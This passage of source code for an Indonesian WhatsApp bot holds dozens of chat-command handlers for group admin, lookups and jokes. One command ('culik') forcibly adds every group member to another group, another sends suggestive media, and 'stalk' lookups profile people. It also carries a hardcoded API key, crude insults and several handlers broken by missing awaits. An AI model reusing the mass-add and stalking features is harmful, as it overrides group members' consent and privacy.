▬▭▬▭▬▭▬▭▬▭▬▭▬`}, {quoted:troli})
}
break
case "tunda": {
if (!isCreator) return replyv1(mess.owner)
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : dtext.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
if (!args[0]) return replyv1(`Contoh ${prefix+command} 628888889699`)
const owned = `${ownNumb}@s.whatsapp.net`
vinz.sendMessage(Pe+'@s.whatsapp.net', {text: `*Hi @${Pe.split("@")[0]} 👋*

▭▬▭( *𝗧𝗥𝗔𝗡𝗦𝗔𝗞𝗦𝗜 𝗣𝗘𝗡𝗗𝗜𝗡𝗚* )▭▬▭


𝗧𝗥𝗔𝗡𝗦𝗔𝗞𝗦𝗜 𝗣𝗘𝗡𝗗𝗜𝗡𝗚
𝗛𝗔𝗥𝗔𝗣 𝗕𝗘𝗥𝗦𝗔𝗕𝗔𝗥

 Powered By *@${owned.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`}, {quoted:troli})
}
break
case "proses": {
if (!isCreator) return replyv1(mess.owner)
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : dtext.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
if (!args[0]) return replyv1(`Contoh ${prefix+command} 628888889699`)
const owned = `${ownNumb}@s.whatsapp.net`
vinz.sendMessage(Pe+'@s.whatsapp.net', {text: `*Hi @${Pe.split("@")[0]} 👋*

▭▬▭( *𝗦𝗘𝗗𝗔𝗡𝗚 𝗗𝗜 𝗣𝗥𝗢𝗦𝗘𝗦* )▭▬▭


𝗛𝗮𝗿𝗮𝗽 𝗧𝘂𝗻𝗴𝗴𝘂 𝗦𝗲𝗯𝗲𝗻𝘁𝗮𝗿
𝗣𝗿𝗼𝗱𝘂𝗸 𝗦𝗲𝗱𝗮𝗻𝗴 𝗗𝗶 𝗣𝗿𝗼𝘀𝗲𝘀️

 Powered By *@${owned.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`}, {quoted:troli})
}
break
case "sosmed": {
const owned = `${ownNumb}@s.whatsapp.net`
const text12 = `*Hi @${m.sender.split("@")[0]} 👋*

▭▬▭( *SOSMED OWNER* )▭▬▭

*INSTAGRAM OWNER :* 
https://instagram.com/vinz_x77?igshid=YTQwZjQ0NmI0OA==
*YOUTUBE OWNER :* 
https://youtube.com/@VinzX7
*TELEGRAM OWNER :* 
https://t.me/vinzxx777
*GROUP OWNER :* 
https://chat.whatsapp.com/EuYpbVhYw5zGGkuR4i8J6w

 Powered By *@${owned.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
vinz.sendMessage(m.chat, { text: text12, contextInfo: { mentionedJid: [m.sender, owned], forwardingScore: 9999, isForwarded: true }}, { quoted: troli })
}
break
case 'pesansementara': {
                if (!m.isGroup) return replywalu(mess.group)
                if (!isBotGroupAdmins) return replywalu(mess.botAdmin)
                if (!isGroupAdmins) return replywalu('Lah Dikira Admin Group Kali')
                    vinz.sendMessage(m.chat, {text:`ketik ${prefix+command}24 untuk menyalakan pesan sementara dalam Waktu 24 jam`})
                    vinz.sendMessage(m.chat, {text:`ketik ${prefix+command}7 untuk menyalakan pesan sementara dalam Waktu 7 hari`})
                    vinz.sendMessage(m.chat, {text:`ketik ${prefix+command}90 untuk menyalakan pesan sementara dalam Waktu 90 hari`})
                    vinz.sendMessage(m.chat, {text:`ketik ${prefix+command}0 untuk mematikan pesan sementara`})
            }
            break
            case `pesansementara24`: {
            if (!m.isGroup) return replywalu(mess.group)
                if (!isBotGroupAdmins) return replywalu(mess.botAdmin)
                if (!isGroupAdmins) return replywalu('Lah Dikira Admin Group Kali')
            vinz.sendMessage(m.chat, { disappearingMessagesInChat: 24*3600 })
            replyv1(`SUKSES MENYALAKAN/MENGGANTI PESAN SEMENTARA KE 24 JAM`)
            }
            break
            case `pesansementara7`: {
            if (!m.isGroup) return replywalu(mess.group)
                if (!isBotGroupAdmins) return replywalu(mess.botAdmin)
                if (!isGroupAdmins) return replywalu('Lah Dikira Admin Group Kali')
            vinz.sendMessage(m.chat, { disappearingMessagesInChat: true })
            replyv1(`SUKSES MENYALAKAN/MENGGANTI PESAN SEMENTARA KE 7 HARI/TRUE`)
            }
            break
            case `pesansementara90`: {
            if (!m.isGroup) return replywalu(mess.group)
                if (!isBotGroupAdmins) return replywalu(mess.botAdmin)
                if (!isGroupAdmins) return replywalu('Lah Dikira Admin Group Kali')
            vinz.sendMessage(m.chat, { disappearingMessagesInChat: 90*24*3600 })
            replyv1(`SUKSES MENYALAKAN/MENGGANTI PESAN SEMENTARA KE 90 HARI`)
            }
            break
            case `pesansementara0`: {
            if (!m.isGroup) return replywalu(mess.group)
                if (!isBotGroupAdmins) return replywalu(mess.botAdmin)
                if (!isGroupAdmins) return replywalu('Lah Dikira Admin Group Kali')
            vinz.sendMessage(m.chat, { disappearingMessagesInChat: false })
            replyv1(`SUKSES DISABLE/MEMATIKAN PESAN SEMENTARA`)
            }
            break
            case 'delete': case 'del': {
            if (!isCreator) return replyv1(mess.owner)
                if (!m.quoted) throw false
                let { chat, fromMe, id, isBaileys } = m.quoted
                if (!isBaileys && !isCreator) throw 'Pesan tersebut bukan dikirim oleh bot!'
                vinz.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: true, id: m.quoted.id, participant: m.quoted.sender } })
            }
            break
            case 'q': case 'quoted': {
            if (!isAuthor) return replyv1(mess.Author)
        		if (!m.quoted) return replyv1('Reply Pesannya!!')
		let wokwol = await vinz.serializeM(await m.getQuotedObj())
		if (!wokwol.quoted) return replyv1('Pesan Yang anda reply tidak mengandung reply')
		await wokwol.quoted.copyNForward(m.chat, true)
            }
	    break
            case 'listpc': {
            if (!isAuthor) return replyv1(mess.Author)
                 let anu = await store.chats.all().filter(v => v.id.endsWith('.net')).map(v => v.id)
                 let teks = `⬣ *LIST PERSONAL CHAT*\n\nTotal Chat : ${anu.length} Chat\n\n`
                 for (let i of anu) {
                     let nama = store.messages[i].array[0].pushName
                     teks += `⬡ *Nama :* ${nama}\n⬡ *User :* @${i.split('@')[0]}\n⬡ *Chat :* https://wa.me/${i.split('@')[0]}\n\n────────────────────────\n\n`
                 }
                 vinz.sendTextWithMentions(m.chat, teks, m)
             }
             break
             case "kalkulator":{
             if (!isCreator && global.db.data.users[m.sender].limit < 1) return replyv1(mess.endLimit) // respon ketika limit habis
                db.data.users[m.sender].limit -= 1
                replyv1(`🚩 1 Limit Used`)
if (dtext.split("+")[0] && dtext.split("+")[1]) {
const nilai_one = Number(dtext.split("+")[0])
const nilai_two = Number(dtext.split("+")[1])
replyv1(`${nilai_one + nilai_two}`)
} else if (dtext.split("-")[0] && dtext.split("-")[1]) {
const nilai_one = Number(dtext.split("-")[0])
const nilai_two = Number(dtext.split("-")[1])
replyv1(`${nilai_one - nilai_two}`)
} else if (dtext.split("×")[0] && dtext.split("×")[1]) {
const nilai_one = Number(dtext.split("×")[0])
const nilai_two = Number(dtext.split("×")[1])
replyv1(`${nilai_one * nilai_two}`)
} else if (dtext.split("÷")[0] && dtext.split("÷")[1]) {
const nilai_one = Number(dtext.split("÷")[0])
const nilai_two = Number(dtext.split("÷")[1])
replyv1(`${nilai_one / nilai_two}`)
} else replyv1(`*Example* : ${prefix + command} 1 + 1`)
}
break
case 'block': case 'blockir': {
if (!isAuthor) return replyv1('*Khusus Author*')
if (!args[0]) return replyv1(`Contoh ${prefix+command} 628888889699`)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : dtext.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await vinz.updateBlockStatus(users, 'block').then((res) => replyv1(jsonformat(res))).catch((err) => replyv1(jsonformat(err)))
await sleep(10)
replycallv1('Udah Di Block Tuan Ku')
}
break
//=================================================//
case 'unblock': case 'unblockir': {
if (!isAuthor) return replyv1('*Khusus Author*')
if (!args[0]) return replyv1(`Contoh ${prefix+command} 628888889699`)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : dtext.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await vinz.updateBlockStatus(users, 'unblock').then((res) => replyv1(jsonformat(res))).catch((err) => replyv1(jsonformat(err)))
replycallv1('Udah Di Unblock Tuan Ku')
}
break
case 'hapus':{
vinz.sendMessage(m.chat,
{
delete: {
remoteJid: m.chat,
fromMe: true,
id: m.quoted.id,
participant: m.quoted.sender
}
})
}
break
case 'listonline':
            case 'liston': {
                if (!m.isGroup) return replywalu(mess.group)
                let id = args && /\d+\-\d+@g.us/.test(args[0]) ? args[0] : m.chat
                let online = [...Object.keys(store.presences[id]), botNumber]
                vinz.sendText(m.chat, '⏰ List Online:\n\n' + online.map(v => '🌱 @' + v.replace(/@.+/, '')).join`\n`, m, {
                    mentions: online
                })
            }
            break
            case 'translate':{
			if (args.length == 0) return replyv1(`Example: ${prefix + command} en Tahu Bacem`)
			replyv1(mess.wait)
			var kode_negara = args[0]
			args.shift()
			var tittt = args.join(' ')
			var { data } = axios.get(`https://api.lolhuman.xyz/api/translate/auto/62?apikey=vinzx7&text=${tittt}`)
			init_txt = `From : ${data.result.from}\n`
			init_txt += `To : ${data.result.to}\n`
			init_txt += `Original : ${data.result.original}\n`
			init_txt += `Translated : ${data.result.translated}\n`
			init_txt += `Pronunciation : ${data.result.pronunciation}\n`
			replyv1(init_txt)
			}
			break
			case 'ss':
			if (!isCreator && global.db.data.users[m.sender].limit < 9) return replyv1(mess.endLimit) // respon ketika limit habis
                db.data.users[m.sender].limit -= 9
                replyv1(`🚩 9 Limit Used`)
			if (args.length == 0) return replyv1(`Example: ${prefix + command} https://api.lolhuman.xyz`)
			vinz.sendMessage(m.chat, { image: { url: `https://api.lolhuman.xyz/api/ssweb?apikey=${apikey}&url=${args[0]}`}, caption: `URL: ${args[0]}`}, { quoted: fkontak })
			break
			
		    case 'ssweb':
		    if (!isCreator && global.db.data.users[m.sender].limit < 9) return replyv1(mess.endLimit) // respon ketika limit habis
                db.data.users[m.sender].limit -= 9
                replyv1(`🚩 9 Limit Used`)
			if (args.length == 0) return replyv1(`Example: ${prefix + command} https://api.lolhuman.xyz`)
			vinz.sendMessage(m.chat, { image: { url: `https://xzn.wtf/api/ssweb?type=desktop&url=${args[0]}&apikey=vinzx7`}, caption: `URL: ${args[0]}`}, { quoted: m})
			break
			
		    case 'shortlink':
		    if (!isCreator && global.db.data.users[m.sender].limit < 9) return replyv1(mess.endLimit) // respon ketika limit habis
                db.data.users[m.sender].limit -= 9
                replyv1(`🚩 9 Limit Used`)
			if (args.length == 0) return replyv1(`Example: ${prefix + command} https://api.lolhuman.xyz`)
			axios.get(`https://api.lolhuman.xyz/api/shortlink4?apikey=${apikey}&url=${full_args}`).then(({ data }) => {
				replyv1(data.result)
			})
			break
			
			// AI FITUR
			case 'aiimage': {
			if (!isCreator && global.db.data.users[m.sender].limit < 15) return replyv1(mess.endLimit) // respon ketika limit habis
                db.data.users[m.sender].limit -= 15
                replyv1(`🚩 15 Limit Used`)
            if (args.length == 0) return replyv1(`Membuat gambar dari AI.\n\nContoh :\n${prefix+command} rumah mewah`)
            vinz.sendMessage(m.chat, { image: { url: `https://api.lolhuman.xyz/api/dall-e?apikey=${apikey}&text=${args[0]}` }, caption: `${args[0]}` }, {quoted:m})
            }
            break
            
            case 'ai':
            if (!isCreator && global.db.data.users[m.sender].limit < 15) return replyv1(mess.endLimit) // respon ketika limit habis
                db.data.users[m.sender].limit -= 15
                replyv1(`🚩 15 Limit Used`)
			if (args.length == 0) return replyv1(`Example: ${prefix + command} ai adalah`)
			axios.get(`https://api.lolhuman.xyz/api/openai?apikey=${apikey}&text=${encodeURIComponent(full_args)}&user=${senderNumber}`).then(({ data }) => {
				replyv1(data.result)
			})
			break
            
            // Information Fitur
            case 'pinterest': 
            case 'image': {
            if (!isCreator && global.db.data.users[m.sender].limit < 6) return replyv1(mess.endLimit) // respon ketika limit habis
                db.data.users[m.sender].limit -= 6
                if (!dtext) return replyv1(`Example : ${prefix + command}`)
                replyv1(`🚩 6 Limit Used`)
		        let { pinterest } = require('./lib/scraper')
                anu = await pinterest(dtext)
                result = anu[Math.floor(Math.random() * anu.length)]               
                vinz.sendMessage(m.chat, { image: { url: result }, caption: 'Done Bro' }, { quoted: m })
            }
            break
            case 'jarak':{
            if (!isCreator && global.db.data.users[m.sender].limit < 1) return replyv1(mess.endLimit) // respon ketika limit habis
                db.data.users[m.sender].limit -= 1
                replyv1(`🚩 1 Limit Used`)
			if (args.length == 0) return replyv1(`Example: ${prefix + command} jakarta - yogyakarta`)
			var titt1 = dtext.split('-')[0]
			var titt2 = dtext.split('-')[1]
			replyv1(mess.wait)
			var { data } = axios.get(`https://api.lolhuman.xyz/api/jaraktempuh?apikey=${apikey}&kota1=${titt1}&kota2=${titt2}`)
			var titt = `Informasi Jarak dari ${titt1} ke ${titt2} :\n\n`
			titt += `\`\`\`◪ Asal :\`\`\` ${data.result.from.name}\n`
			titt += `\`\`\`◪ Garis Lintang :\`\`\` ${data.result.from.latitude}\n`
			titt += `\`\`\`◪ Garis Bujur :\`\`\` ${data.result.from.longitude}\n\n`
			titt += `\`\`\`◪ Tujuan :\`\`\` ${data.result.to.name}\n`
			titt += `\`\`\`◪ Garis Lintang :\`\`\` ${data.result.to.latitude}\n`
			titt += `\`\`\`◪ Garis Bujur :\`\`\` ${data.result.to.longitude}\n\n`
			titt += `\`\`\`◪ Jarak Tempuh :\`\`\` ${data.result.jarak}\n`
			titt += `\`\`\`◪ Waktu Tempuh :\`\`\`\n`
			titt += `   ╭───────────────❏\n`
			titt += `❍┤ Kereta Api : ${data.result.kereta_api}\n`
			titt += `❍┤ Pesawat : ${data.result.pesawat}\n`
			titt += `❍┤ Mobil : ${data.result.mobil}\n`
			titt += `❍┤ Motor : ${data.result.motor}\n`
			titt += `❍┤ Jalan Kaki : ${data.result.jalan_kaki}\n`
			titt += `   ╰───────────────❏\n`
			replyv1(titt)
			}
			break
			
			case 'wikipedia':
			if (!isCreator && global.db.data.users[m.sender].limit < 12) return replyv1(mess.endLimit) // respon ketika limit habis
                db.data.users[m.sender].limit -= 12
                replyv1(`🚩 12 Limit Used`)
			if (args.length == 0) return replyv1(`Example: ${prefix + command} Tahu`)
			replyv1(mess.wait)
			var { data } = await axios.get(`https://api.lolhuman.xyz/api/wiki?apikey=${apikey}&query=${full_args}`)
			replyv1(data.result)
			break
		case 'brainly':{
			if (args.length == 0) return replyv1(`Example: ${prefix + command} siapakah sukarno`)
			replyv1(mess.wait)
			var { data } = axios.get(`https://api.lolhuman.xyz/api/brainly?apikey=${apikey}&query=${full_args}`)
			var ti  = 'Beberapa Pembahasan Dari Brainly :\n\n'
			{
				ti  += `==============================\n`
				ti  += `\`\`\`Pertanyaan :\`\`\`\n${data.result.question.content}\n\n`
				ti  += `\`\`\`Jawaban :\`\`\`\n${data.result.answer[0].content}\n`
				ti  += `==============================\n\n`
			}
			replyv1(ti )
			}
			break
		    case 'roboguru':{
			if (args.length == 0) return replyv1(`Example: ${prefix + command} siapakah sukarno`)
			replyv1(mess.wait)
			var { data } = axios.get(`https://api.lolhuman.xyz/api/roboguru?apikey=${apikey}&query=${full_args}&grade=sma&subject=sejarah`)
			var tit = 'Beberapa Pembahasan Dari Roboguru :\n\n'
			for (var x of data.result) {
				tit += `==============================\n`
				tit += `\`\`\`Pertanyaan :\`\`\`\n${x.question}\n\n`
				tit += `\`\`\`Jawaban :\`\`\`\n${x.answer}\n`
				tit += `==============================\n\n`
			}
			replyv1(tit)
			}
			break
			case 'kodepos':
			if (args.length == 0) return replyv1(`Example: ${prefix + command} Slemanan or ${prefix + command} 66154`)
			replyv1('Silahkan Tunggu')
			var { data } = axios.get(`https://api.lolhuman.xyz/api/kodepos?apikey=${apikey}&query=${full_args}`)
			var tittttttttttt = `Provinsi : ${data.result[0].province}\n`
			tittttttttttt += `Kabupaten : ${data.result[0].city}\n`
			tittttttttttt += `Kecamatan : ${data.result[0].subdistrict}\n`
			tittttttttttt += `Kelurahan : ${data.result[0].urban}\n`
			tittttttttttt += `Kode Pos : ${data.result[0].postalcode}`
			replyv1(tittttttttttt)
			break
			
		    case 'jadwalbola':
			var { data } = await axios.get(`https://api.lolhuman.xyz/api/jadwalbola?apikey=${apikey}`)
			replyv1('Silahkan Tunggu')
			var titttttttttttt = 'Jadwal Bola :\n'
			for (var x of data.result) {
				titttttttttttt += `Pada : ${x.time}\n`
				titttttttttttt += `Event : ${x.event}\n`
				titttttttttttt += `Match : ${x.match}\n`
				titttttttttttt += `TV : ${x.tv}\n\n`
			}
			replyv1(titttttttttttt)
			break
			case 'genshin':
			if (args.length == 0) return replyv1(`Example: ${prefix + command} jean`)
			replyv1('Silahkan Tunggu')
			var { data } = axios.get(`https://api.lolhuman.xyz/api/genshin/${full_args}?apikey=${apikey}`)
			var caption = `Name : ${data.result.title}\n`
			caption += `Intro : ${data.result.intro}\n`
			caption += `Icon : ${data.result.icon}\n`
			await vinz.sendMessage(m.chat, { image: { url: data.result.cover1 }, caption })
			await vinz.sendMessage(m.chat, { audio: { url: data.result.cv[0].audio[0] }, mimetype: 'audio/mp4' })
			break
			case 'apakah': {
                if (!dtext) return replyv1(`Penggunaan ${command} text\n\nContoh : ${command} saya wibu`)
                const apa = ['Iya', 'Tidak', 'Bisa Jadi', 'Betul']
                const kah = apa[Math.floor(Math.random() * apa.length)]
                replyv1(`Pertanyaan : Apakah ${dtext}\nJawaban : ${kah}`)
                }
                break
            case 'bisakah': {
                if (!dtext) return replyv1(`Penggunaan ${command} text\n\nContoh : ${command} saya wibu`)
                const bisa = ['Bisa', 'Gak Bisa', 'Gak Bisa Ajg Aaokawpk', 'TENTU PASTI KAMU BISA!!!!']
                const ga = bisa[Math.floor(Math.random() * bisa.length)]
                replyv1(`Pertanyaan : Apakah ${dtext}\nJawaban : ${ga}`)
                }
                break
            case 'bagaimanakah': {
                if (!dtext) return replyv1(`Penggunaan ${command} text\n\nContoh : ${command} saya wibu`)
                const gimana = ['Gak Gimana2', 'Sulit Itu Bro', 'Maaf Bot Tidak Bisa Menjawab', 'Coba Deh Cari Di Gugel', 'astaghfirallah Beneran???', 'Pusing ah', 'Owhh Begitu:(', 'Yang Sabar Ya Bos:(', 'Gimana yeee']
                const ya = gimana[Math.floor(Math.random() * gimana.length)]
                replyv1(`Pertanyaan : Apakah ${dtext}\nJawaban : ${ya}`)
                }
            break
            case 'rate': {
                if (!dtext) return replyv1(`Penggunaan ${command} text\n\nContoh : ${command} Gambar aku`)
                const ra = ['5', '10', '15', '20', '25', '30', '35', '40', '45', '50', '55', '60', '65', '70', '75', '80', '85', '90', '95', '100']
                const te = ra[Math.floor(Math.random() * ra.length)]
                replyv1(`Rate : ${dtext}\nJawaban : *${te}%*`)
                }
            break
            case 'igstalk': {
			if (args.length == 0) return replyv1(`Example: ${prefix + command} whyzzxy`)
			replyv1('Silahkan Tunggu')
			axios.get(`https://api.lolhuman.xyz/api/stalkig/${full_args}?apikey=${apikey}`).then(({ data }) => {
				var caption = `Username : ${data.result.username}\n`
				caption += `Full Name : ${data.result.fullname}\n`
				caption += `Posts : ${data.result.posts}\n`
				caption += `Followers : ${data.result.followers}\n`
				caption += `Following : ${data.result.following}\n`
				caption += `Bio : ${data.result.bio}`
				vinz.sendMessage(m.chat, { image: { url: data.result.photo_profile }, caption })
			})
			
			}
			break
			case 'listgc': {
                if (!isAuthor) return replyv1(mess.Author)
                let anu = await store.chats.all().filter(v => v.id.endsWith('@g.us')).map(v => v.id)
                let tekslistgc = `👥 *LIST GROUP CHAT*\n\n`
                tekslistgc += `📱 Total Group : ${anu.length} Group\n\n`
                for (let e of anu) {
                    let metadata = await vinz.groupMetadata(e)
                    tekslistgc += `📛 *Nama :* ${metadata.subject}\n`
                    tekslistgc += `👤 *Owner Grup :* ${metadata.owner !== undefined ? '@' + metadata.owner.split`@`[0] : 'Tidak diketahui'}\n`
                    tekslistgc += `🌱 *ID :* ${metadata.id}\n`
                    tekslistgc += `⏳ *Dibuat :* ${moment(metadata.creation * 1000).tz('Asia/Jakarta').format('DD/MM/YYYY HH:mm:ss')}\n`
                    tekslistgc += `👥 *Member :* ${metadata.participants.length}\n\n`
                    tekslistgc += `──────────────────────\n\n`
                }
                replyv1(tekslistgc)
            }
        break
        case 'react': {
                if (!isCreator) return replyv1('𝙺𝚑𝚞𝚜𝚞𝚜 𝙿𝚛𝚎𝚖𝚒𝚞𝚖!')
                if (!args[0]) return replyv1(`Example: ${prefix + command} Titid`)
                reactionMessage = {
                    react: {
                        text: args[0],
                        key: { remoteJid: m.chat, fromMe: true, id: quoted.id }
                    }
                }
                vinz.sendMessage(m.chat, reactionMessage)
            }
        break
        case 'shutdown': {
             if (!isAuthor) return replyv1(mess.Author)
			 replyv1(`Otsukaresama deshita🖐`)
             await sleep(3000)
             vinz.updateProfileStatus(`I am ${botname} | Sedang Offline `).catch((_)=>_);
             process.exit()
             }
        break
        case 'totag': {
               if (!m.isGroup) return replywalu(mess.group)
               if (!isBotGroupAdmins) return replywalu(mess.botAdmin)
               if (!isGroupAdmins) return replywalu('Lah Dikira Admin Group Kali')
               if (!m.quoted) return `Reply pesan dengan caption ${prefix + command}`
               vinz.sendMessage(m.chat, { forward: m.quoted.fakeObj, mentions: participants.map(a => a.id) })
               }
               break
               case 'wangy': {
                if (!dtext) return replyv1(`Contoh : .wangy Riy`)
                qq = dtext.toUpperCase()
                awikwok = `${qq} ${qq} ${qq} ❤️ ❤️ ❤️ WANGY WANGY WANGY WANGY HU HA HU HA HU HA, aaaah baunya rambut ${qq} wangyy aku mau nyiumin aroma wangynya ${qq} AAAAAAAAH ~ Rambutnya.... aaah rambutnya juga pengen aku elus-elus ~~ AAAAAH ${qq} keluar pertama kali di anime juga manis ❤️ ❤️ ❤️ banget AAAAAAAAH ${qq} AAAAA LUCCUUUUUUUUUUUUUUU............ ${qq} AAAAAAAAAAAAAAAAAAAAGH ❤️ ❤️ ❤️apa ? ${qq} itu gak nyata ? Cuma HALU katamu ? nggak, ngak ngak ngak ngak NGAAAAAAAAK GUA GAK PERCAYA ITU DIA NYATA NGAAAAAAAAAAAAAAAAAK PEDULI BANGSAAAAAT !! GUA GAK PEDULI SAMA KENYATAAN POKOKNYA GAK PEDULI. ❤️ ❤️ ❤️ ${qq} gw ... ${qq} di laptop ngeliatin gw, ${qq} .. kamu percaya sama aku ? aaaaaaaaaaah syukur ${dtext} aku gak mau merelakan ${qq} aaaaaah ❤️ ❤️ ❤️ YEAAAAAAAAAAAH GUA MASIH PUNYA ${qq} SENDIRI PUN NGGAK SAMA AAAAAAAAAAAAAAH`
                replyv1(awikwok)
                }
            break
            
            case 'cekmati': {
                if (!dtext) return replyv1(`Invalid!\n\nYg mau di cek siapa kontol?`)
                predea = await axios.get(`https://api.agify.io/?name=${dtext}`)
                replyv1(`Nama : ${predea.data.name}\n*Mati Pada Umur :* ${predea.data.age} Tahun.\n\n_Cepet Cepet Tobat Bro Soalnya Mati ga ada yang tau_`)
                }
            break
            case 'pindl':
			case 'pindownload': {
			if (!isCreator && global.db.data.users[m.sender].limit < 9) return replyv1(mess.endLimit) // respon ketika limit habis
                db.data.users[m.sender].limit -= 9
                replyv1(`🚩 9 Limit Used`)
			    if (args.length == 0) return replyv1(`Contoh: ${prefix + command} https://pin.it/3E5fARH`)
			    let anu = axios.get(`https://api.lolhuman.xyz/api/pinterestdl?apikey=${apikey}&url=${full_args}`).then(({ data }) => {
			    vinz.sendMessage(m.chat, { video: { url: data.result }, caption: `By ${botname}`}, { quoted: fkontak })
			    })
			    }
			break
			case 'tafsirsurah': {
                if (!args[0]) return replyv1(`Contoh penggunaan:\n${prefix + command} 1 2\n\nmaka hasilnya adalah tafsir surah Al-Fatihah ayat 2`)
                if (!args[1]) return replyv1(`Contoh penggunaan:\n${prefix + command} 1 2\n\nmaka hasilnya adalah tafsir surah Al-Fatihah ayat 2`)
                let res = await fetchJson(`https://islamic-api-indonesia.herokuapp.com/api/data/quran?surah=${full_args}&ayat=${args[1]}`)
                let txt = `「 *Tafsir Surah*  」

*Pendek* : ${res.result.data.tafsir.id.short}

*Panjang* : ${res.result.data.tafsir.id.long}

( Q.S ${res.result.data.surah.name.transliteration.id} : ${res.result.data.number.inSurah} )`
                replyv1(txt)
            }
            break
            case 'paptt':
            if (!isCreator) return replyv1(mess.owner)
            if (!dtext) return replyv1(`Example ${prefix + command} foto/video`)
            let papttfoto = JSON.parse(fs.readFileSync('./lib/paptt-foto.json'))
            let papttvideo = JSON.parse(fs.readFileSync('./lib/paptt-video.json'))
            let titid1 = (getRandom(papttfoto))
            let titid2 = (getRandom(papttvideo))
            if (dtext == 'foto') {
                replyv1("Foto Akan Dikirim Lewat Private Chat ( *PC* )")
                vinz.sendMessage(m.sender, { image: { url: titid1 }, caption: 'Mana Tahan🥵'}, { quoted: fkontak })
            } else if (dtext == 'video') {
                replyv1("Video Akan Dikirim Lewat Private Chat ( *PC* )")
                vinz.sendMessage(m.sender, { video: { url: titid2 }, caption: 'Mana Tahan🥵'}, { quoted: fkontak })
            }
        break
            case 'chat': {
                if (!isCreator) return replyv1(mess.owner)
                if (!dtext) return replyv1('Option : \n1. mute\n2. unmute\n3. archive\n4. unarchive\n5. read\n6. unread\n7. delete')
                if (args[0] === 'mute') {
                    vinz.chatModify({ mute: 'Infinity' }, m.chat, []).then((res) => replyv1(jsonformat(res))).catch((err) => replyv1(jsonformat(err)))
                } else if (args[0] === 'unmute') {
                    vinz.chatModify({ mute: null }, m.chat, []).then((res) => replyv1(jsonformat(res))).catch((err) => replyv1(jsonformat(err)))
                } else if (args[0] === 'archive') {
                    vinz.chatModify({ archive: true }, m.chat, []).then((res) => replyv1(jsonformat(res))).catch((err) => replyv1(jsonformat(err)))
                } else if (args[0] === 'unarchive') {
                    vinz.chatModify({ archive: false }, m.chat, []).then((res) => replyv1(jsonformat(res))).catch((err) => replyv1(jsonformat(err)))
                } else if (args[0] === 'read') {
                    vinz.chatModify({ markRead: true }, m.chat, []).then((res) => replyv1(jsonformat(res))).catch((err) => replyv1(jsonformat(err)))
                } else if (args[0] === 'unread') {
                    vinz.chatModify({ markRead: false }, m.chat, []).then((res) => replyv1(jsonformat(res))).catch((err) => replyv1(jsonformat(err)))
                } else if (args[0] === 'delete') {
                    vinz.chatModify({ clear: { message: { id: m.quoted.id, fromMe: true }} }, m.chat, []).then((res) => replyv1(jsonformat(res))).catch((err) => replyv1(jsonformat(err)))
                }
            }
        break
            case 'ghstalk': {
            if (!isCreator && global.db.data.users[m.sender].limit < 5) return replyv1(mess.endLimit) // respon ketika limit habis
                db.data.users[m.sender].limit -= 5
                replyv1(`🚩 5 Limit Used`)
			if (args.length == 0) return replyv1(`Example: ${prefix + command} VinzDeMoster`)
			replyv1('Silahkan Tunggu')
			axios.get(`https://api.lolhuman.xyz/api/github/${full_args}?apikey=${apikey}`).then(({ data }) => {
				var caption = `Name : ${data.result.name}\n`
				caption += `Link : ${data.result.url}\n`
				caption += `Public Repo : ${data.result.public_repos}\n`
				caption += `Public Gists : ${data.result.public_gists}\n`
				caption += `Followers : ${data.result.followers}\n`
				caption += `Following : ${data.result.following}\n`
				caption += `Bio : ${data.result.bio}`
				vinz.sendMessage(m.chat, { image: { url: data.result.avatar }, caption })
			})
			
			}
			break
			case 'kbbi':{
			if (args.length == 0) return replyv1(`Example: ${prefix + command} kursi`)
			replyv1('Silahkan Tunggu')
			var { data } = axios.get(`https://api.lolhuman.xyz/api/kbbi?apikey=${apikey}&query=${full_args}`)
			var titid = `\`\`\`Kata : ${data.result[0].nama}\`\`\`\n`
			titid += `\`\`\`Kata Dasar : ${data.result[0].kata_dasar}\`\`\`\n`
			titid += `\`\`\`Pelafalan : ${data.result[0].pelafalan}\`\`\`\n`
			titid += `\`\`\`Bentuk Tidak Baku : ${data.result[0].bentuk_tidak_baku}\`\`\`\n\n`
			for (var x of data.result) {
				titid += `\`\`\`Kode : ${x.makna[0].kelas[0].kode}\`\`\`\n`
				titid += `\`\`\`Kelas : ${x.makna[0].kelas[0].nama}\`\`\`\n`
				titid += `\`\`\`Artinya : \n${x.makna[0].kelas[0].deskripsi}\`\`\`\n\n`
				titid += `\`\`\`Makna Lain : \n${x.makna[0].submakna}\`\`\`\n `
				titid += `\`\`\`Contoh Kalimat : \n${x.makna[0].contoh}\`\`\`\n`
			}
			replyv1(titid)
			}
			break
			case 'git': case 'gitclone': {
			if (!isCreator && global.db.data.users[m.sender].limit < 3) return replyv1(mess.endLimit) // respon ketika limit habis
                db.data.users[m.sender].limit -= 3
                replyv1(`🚩 3 Limit Used`)
                if (!args[0]) return replyv1(`Mana link nya?\nContoh :\n${prefix}${command} https://github.com/YukiShima4/tes`)
                if (!isUrl(args[0]) && !args[0].includes('github.com')) return replyv1(`Link invalid!!`)
                let regex1 = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i
                let [, user, repo] = args[0].match(regex1) || []
                repo = repo.replace(/.git$/, '')
                let url = `https://api.github.com/repos/${user}/${repo}/zipball`
                let filename = (await fetch(url, {method: 'HEAD'})).headers.get('content-disposition').match(/attachment; filename=(.*)/)[1]
                vinz.sendMessage(m.chat, { document: { url: url }, fileName: filename+'.zip', mimetype: 'application/zip' }, { quoted: m }).catch((err) => reply(err))
            }       
            break
            case 'culik': {
                if (args.length < 1) return replyv1('_*Masukin id grupnya tolol*_')
                let pantek = []
                for (let i of groupMembers) {
                    pantek.push(i.jid)
                }
                vinz.groupParticipantsUpdate(args[0], pantek)
            }
            break
            case 'play': case 'ytplay':{
